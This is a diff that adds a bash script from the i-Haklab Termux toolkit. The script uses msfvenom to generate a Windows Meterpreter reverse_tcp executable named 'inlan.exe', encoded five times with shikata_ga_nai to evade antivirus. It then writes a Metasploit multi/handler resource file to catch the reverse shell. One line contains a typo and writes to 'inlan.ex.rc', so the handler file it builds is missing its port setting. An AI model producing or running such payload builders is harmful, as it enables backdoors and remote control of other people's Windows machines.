@@ -1,0 +1,24 @@
+#!/bin/bash
+#This file is part of i-Haklab command
+
+if [ -d /data/data/com.termux/files/home/i-Haklab ]; then
+        iHAKLAB=/data/data/com.termux/files/home/i-Haklab                                   else
+        iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
+fi
+
+source $iHAKLAB/.set/libexec/colors
+source $iHAKLAB/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+
+if [ ! -d ~/java/handler ]; then
+	mkdir -p ~/java/handler
+fi
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -f exe -e x86/shikata_ga_nai -i 5 -o inlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+echo "use exploit/multi/handler" > ~/java/handler/inlan.exe.rc
+echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/inlan.exe.rc
+echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.exe.rc
+echo "set LPORT 4546" >> ~/java/handler/inlan.ex.rc
+echo "run" >> ~/java/handler/inlan.exe.rc
+printf "$Y[i]->$W Payload saved as$G inlan.exe$W\n"
+printf "$Y[i]->$W Handler file saved as$G inlan.exe.rc$W\n"
